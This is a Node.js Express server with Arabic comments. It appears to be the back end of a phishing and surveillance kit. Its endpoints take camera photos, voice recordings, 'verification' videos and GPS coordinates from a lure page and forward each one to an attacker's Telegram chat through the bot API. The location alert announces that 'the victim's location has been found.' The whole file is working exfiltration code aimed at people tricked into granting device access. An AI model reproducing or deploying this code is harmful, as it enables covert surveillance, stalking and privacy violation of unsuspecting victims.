require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

const app = express();
const upload = multer({ dest: 'uploads/' });
app.use(express.static('public'));

if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');

const BOT_TOKEN = process.env.BOT_TOKEN;
const BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// 1. استقبال الصور (كاميرا)
app.post('/upload', upload.array('photos', 3), async (req, res) => {
  try {
    if (!req.files || req.files.length === 0) return res.status(400).json({ ok: false });
    const targetChatId = req.body.chat_id;
    if (!targetChatId) return res.status(400).json({ ok: false, error: 'لا يوجد ID' });

    for (let i = 0; i < req.files.length; i++) {
      const file = req.files[i];
      const form = new FormData();
      form.append('chat_id', targetChatId); 
      form.append('caption', `📸 صورة ${i + 1} من ${req.files.length}`);
      form.append('photo', fs.createReadStream(file.path));
      await axios.post(`${BOT_URL}/sendPhoto`, form, { headers: form.getHeaders(), maxBodyLength: Infinity });
      fs.unlinkSync(file.path);
    }
    res.json({ ok: true, count: req.files.length });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

// 2. استقبال الصوت (بوابة الضل)
app.post('/upload_voice', upload.single('voice'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد صوت' });
    const targetChatId = req.body.chat_id;
    if (!targetChatId) return res.status(400).json({ ok: false, error: 'لا يوجد ID' });

    const form = new FormData();
    form.append('chat_id', targetChatId);
    form.append('caption', '🎙️ بصمة صوتية جديدة!');
    form.append('voice', fs.createReadStream(req.file.path));

    await axios.post(`${BOT_URL}/sendVoice`, form, { headers: form.getHeaders(), maxBodyLength: Infinity });
    fs.unlinkSync(req.file.path);
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

// 3. استقبال الفيديو (المتجر)
app.post('/upload_video', upload.single('video'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ ok: false, error: 'لا يوجد فيديو' });
    const targetChatId = req.body.chat_id;
    const platform = req.body.platform || 'غير معروف';
    const amount = req.body.amount || '0';
    const username = req.body.username || 'غير معروف';
    if (!targetChatId) return res.status(400).json({ ok: false, error: 'لا يوجد ID' });

    const form = new FormData();
    form.append('chat_id', targetChatId);
    form.append('caption', `🎥 فيديو تحقق!\n📱 المنصة: ${platform}\n👤 اليوزر: ${username}\n👥 الكمية: ${amount}`);
    form.append('video', fs.createReadStream(req.file.path));

    await axios.post(`${BOT_URL}/sendVideo`, form, { headers: form.getHeaders(), maxBodyLength: Infinity });
    fs.unlinkSync(req.file.path);
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

// 4. استقبال الموقع (GPS)
app.post('/upload_location', upload.none(), async (req, res) => {
  try {
    const targetChatId = req.body.chat_id;
    const lat = req.body.lat;
    const lon = req.body.lon;
    const accuracy = req.body.accuracy;

    if (!targetChatId || !lat || !lon) return res.status(400).json({ ok: false });

    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    const message = `📍 <b>تم تحديد موقع الضحية!</b>\n\n`
                  + `🌍 <b>خط العرض:</b> ${lat}\n`
                  + `🌍 <b>خط الطول:</b> ${lon}\n`
                  + `🎯 <b>الدقة:</b> ${accuracy} متر\n\n`
                  + `🔗 <a href="${googleMapsLink}">اضغط هنا لفتح الموقع على خرائط جوجل</a>`;

    await axios.post(`${BOT_URL}/sendMessage`, {
      chat_id: targetChatId,
      text: message,
      parse_mode: 'HTML'
    });
    
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ ok: false, error: err.message }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on ${PORT}`));
